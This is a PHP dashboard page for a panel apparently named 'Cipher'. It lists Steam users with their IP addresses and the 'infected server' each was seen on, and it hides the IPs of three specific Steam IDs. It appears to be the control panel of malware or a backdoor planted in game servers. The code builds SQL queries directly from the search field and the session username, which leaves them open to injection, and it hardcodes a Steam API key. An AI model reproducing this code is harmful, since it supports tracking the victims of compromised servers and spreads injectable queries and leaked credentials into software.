<?php
session_start();  
if(!isset($_SESSION["username"]))  
{  
      die(header("location:login.php"));  
}   
include "includes/eldb.php";
$ifban = "SELECT ban FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifban)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ban"] == 1){
                die(header("location:oops.php"));
            }
        }
    }
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$ifip = "SELECT ipvalidate FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifip)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ipvalidate"] != $ip){
                die(header("location:oh!.php"));
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="assets/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    Cipher - Utilisateurs steam
  </title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
  <script src="https://kit.fontawesome.com/647923b639.js"></script>
  <!-- CSS Files -->
  <link href="assets/css/material-dashboard.css?v=2.1.0" rel="stylesheet" />
</head>

<body class="dark-edition">
  <div class="wrapper ">
<?php include "includes/side.php"; ?>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-transparent navbar-absolute fixed-top " id="navigation-example">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <a class="navbar-brand" href="dashboard.php">Retour à la dashboard</a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation" data-target="#navigation-example">
            <span class="sr-only">Navigation</span>
            <span class="navbar-toggler-icon icon-bar"></span>
            <span class="navbar-toggler-icon icon-bar"></span>
            <span class="navbar-toggler-icon icon-bar"></span>
          </button>
          <div class="collapse navbar-collapse justify-content-end">
              <form class="navbar-form" method="POST">
              <div class="input-group no-border">
                <input type="text" value="" name="searchreci" class="form-control" placeholder="Rechercher...">
                <button type="submit" class="btn btn-default btn-round btn-just-icon">
                  <i class="material-icons">search</i>
                  <div class="ripple-container"></div>
                </button>
              </div>
            </form>
            <ul class="navbar-nav">
              <li class="nav-item">
                <a class="nav-link" href="servers.php">
                  <i class="fas fa-server"></i>
                  <p class="d-lg-none d-md-block">
                    Serveurs
                  </p>
                </a>
              </li>
              <!-- <li class="nav-item">
                <a class="nav-link" href="javascript:void(0)">
                  <i class="material-icons">person</i>
                  <p class="d-lg-none d-md-block">
                    Compte
                  </p>
                </a>
              </li> -->
            </ul>
          </div>
        </div>
      </nav>
      <!-- End Navbar -->
       <div class="content">
        <div class="container-fluid">
                    <!-- FIN MODAL -->
        <? if (!isset($_POST["searchreci"])){ ?>
          <div class="row">
            <?php
              if (isset($_GET['pageno'])) {
                  $pageno = $_GET['pageno'];
              } else {
                  $pageno = 1;
              }
              $no_of_records_per_page = 12;
              $offset = ($pageno-1) * $no_of_records_per_page; 
              $total_pages_sql = "SELECT COUNT(*) FROM steamusers";
              $result = mysqli_query($db,$total_pages_sql);
              $total_rows = mysqli_fetch_array($result)[0];
              $total_pages = ceil($total_rows / $no_of_records_per_page);

            $sql = "SELECT * FROM steamusers LIMIT $offset, $no_of_records_per_page";
  if($result = mysqli_query($db, $sql)){
    if(mysqli_num_rows($result) > 0){
      while($row = mysqli_fetch_array($result)){ 
        $url = "http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=68E85B72A3AE1B0E9A53BCA2F60D385B&steamids=".$row["steamid"];
        $json = file_get_contents($url);
        $table2 = json_decode($json, true);
        $table = $table2["response"]["players"][0]["avatarfull"];
        $tableu = $table2["response"]["players"][0]["profileurl"];
?>

            <div class="col-md-3">
              <div class="card card-profile">
                <div class="card-avatar">
                    <img class="img" src="<?php echo $table; ?>" style="width: 90px;"  />
                </div>
                <div class="card-body">
                  <h6 class="card-category">Utilisateur</h6>
                  <a href="<? echo $tableu; ?>" target="_blank">
                  <h4 class="card-title"><?php echo $row["name"]; ?></h4>
                   </a>
                  <p class="card-description">
                    <?php $check = "SELECT * FROM users WHERE username = '".$_SESSION['username']."'";
                                    if($resultc = mysqli_query($db, $check)){
                                      if(mysqli_num_rows($resultc) > 0){
                                        while($rowa = mysqli_fetch_array($resultc)){
                                          if ($row["steamid"] == "76561198117815749" or $row["steamid"] == "76561198137837716" or $row["steamid"] == "76561198156431434"){ ?>
                    Adresse IP : cachée
                  <? }else{ ?>
                    Adresse IP : <?php echo $row["ip"]; ?>
                  <? } 
                  }
                  }
                  } ?>
                    <br>
                    Serveur infecté : <?php echo $row["server"]; ?>
                  </p>
                  
                </div>
              </div>
             </div>

              <?
            }
            }
          } ?>
          <ul class="pagination">
        <li><a href="?pageno=1">↞</a></li>
        <li class="<?php if($pageno <= 1){ echo 'disabled'; } ?>">
            <a href="<?php if($pageno <= 1){ echo '#'; } else { echo "?pageno=".($pageno - 1); } ?>">&nbsp; ← </a>
        </li>
        <li class="<?php if($pageno >= $total_pages){ echo 'disabled'; } ?>">
            <a href="<?php if($pageno >= $total_pages){ echo '#'; } else { echo "?pageno=".($pageno + 1); } ?>">&nbsp; → </a>
        </li>
        <li class="text-primary"><a href="?pageno=<?php echo $total_pages; ?>">&nbsp; ↠</a></li>
    </ul>
            </div> <? }else{ ?>
<div class="row">
            <?php
            $searchval = $_POST["searchreci"];
              if (isset($_GET['pageno'])) {
                  $pageno = $_GET['pageno'];
              } else {
                  $pageno = 1;
              }
              $no_of_records_per_page = 12;
              $offset = ($pageno-1) * $no_of_records_per_page; 
              $total_pages_sql = "SELECT COUNT(*) FROM steamusers";
              $result = mysqli_query($db,$total_pages_sql);
              $total_rows = mysqli_fetch_array($result)[0];
              $total_pages = ceil($total_rows / $no_of_records_per_page);
            $sql = "SELECT * FROM steamusers WHERE name LIKE '$searchval%' LIMIT $offset, $no_of_records_per_page";
  if($result = mysqli_query($db, $sql)){
    if(mysqli_num_rows($result) > 0){
      while($row = mysqli_fetch_array($result)){ 
        $url = "http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=68E85B72A3AE1B0E9A53BCA2F60D385B&steamids=" . $row["steamid"];
        $json = file_get_contents($url);
        $table2 = json_decode($json, true);
        $table = $table2["response"]["players"][0]["avatarfull"];
        $tableu = $table2["response"]["players"][0]["profileurl"];
?>

            <div class="col-md-3">
              <div class="card card-profile">
                <div class="card-avatar">
                    <img class="img" src="<?php echo $table; ?>" style="width: 90px;"  />
                </div>
                <div class="card-body">
                  <h6 class="card-category">Utilisateur</h6>
                  <a href="<? echo $tableu; ?>" target="_blank">
                  <h4 class="card-title"><?php echo $row["name"]; ?></h4>
                   </a>
                  <p class="card-description">
                    Adresse IP : <?php echo $row["ip"]; ?>
                    <br>
                    Serveur infecté : <?php echo $row["server"]; ?>
                  </p>
                  
                </div>
              </div>
          </div>
              <?
            }
            }
          } ?>           <ul class="pagination">
        <li><a href="?pageno=1">↞</a></li>
        <li class="<?php if($pageno <= 1){ echo 'disabled'; } ?>">
            <a href="<?php if($pageno <= 1){ echo '#'; } else { echo "?pageno=".($pageno - 1); } ?>">&nbsp; ← </a>
        </li>
        <li class="<?php if($pageno >= $total_pages){ echo 'disabled'; } ?>">
            <a href="<?php if($pageno >= $total_pages){ echo '#'; } else { echo "?pageno=".($pageno + 1); } ?>">&nbsp; → </a>
        </li>
        <li class="text-primary"><a href="?pageno=<?php echo $total_pages; ?>">&nbsp; ↠</a></li>
    </ul>
    </div> <?
          }  ?>
        </div>
      </div>
    </div>
  </div>
 </div>
  <!--   Core JS Files   -->
  <script src="assets/js/core/jquery.min.js"></script>
  <script src="assets/js/core/popper.min.js"></script>
  <script src="assets/js/core/bootstrap-material-design.min.js"></script>
  <script src="https://unpkg.com/default-passive-events"></script>
  <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Place this tag in your head or just before your close body tag. -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>
  <!-- Chartist JS -->
  <script src="assets/js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="assets/js/material-dashboard.js?v=2.1.0"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
</body>
<?php if (isset($_POST["success"])) { ?> 
<script> md.showNotification("top","right","3","<?php echo htmlspecialchars($_POST["success"]) ?>","done") </script>
<?php } ?>
<?php if (isset($_POST["error"])) { ?> 
<script> md.showNotification("top","right","2","<?php echo htmlspecialchars($_POST["error"]) ?>","report_problem") </script>
<?php } ?>
</html>
<?php
